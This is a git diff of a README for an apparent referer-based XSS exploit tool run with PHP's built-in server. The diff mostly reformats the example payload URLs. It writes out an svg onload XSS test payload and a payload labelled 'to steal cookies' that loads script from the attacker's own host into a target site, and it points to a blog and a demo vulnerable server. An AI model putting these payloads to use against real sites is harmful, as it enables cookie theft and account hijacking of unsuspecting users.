@@ -7,23 +7,27 @@ Start the server from the repo directory with:
 php -S 0.0.0.0:80
 ```
 
-### Example
+### Example Payloads
 
 for testing:
+
 ```
-[http://OUR_IP/index.php/<svg/onload=alert(document.domain)>?target=TARGET_URL]
+http://OUR_IP/index.php/<svg/onload=alert(document.domain)>?target=TARGET_URL
 ```
+
 *Note: Replace OUR_IP and TARGET_URL as appropriate.*
 
 or to steal cookies:
+
 ```
-[http://OUR_IP<script src=http://OUR_IP/script.js></script>?target=TARGET_URL]
+http://OUR_IP<script src=http://OUR_IP/script.js></script>?target=TARGET_URL
 ```
 
 Code based on what's discussed at Geekboy's blog here:
 https://www.geekboy.ninja/blog/exploiting-unusual-referer-based-xss/
 
-Geekboy also set up a vulnerable server for testing as discussed in the blog entry linked above. This link works as a test of our index.php file:
+Geekboy also set up a vulnerable server for testing as discussed in the blog entry linked above. This link will work as a test of our index.php file:
+
 ```
 http://OUR_IP/index.php/<svg/onload=alert(document.domain)>?target=http://p0c.geekboy.ninja/rxss-demo.php
 ```
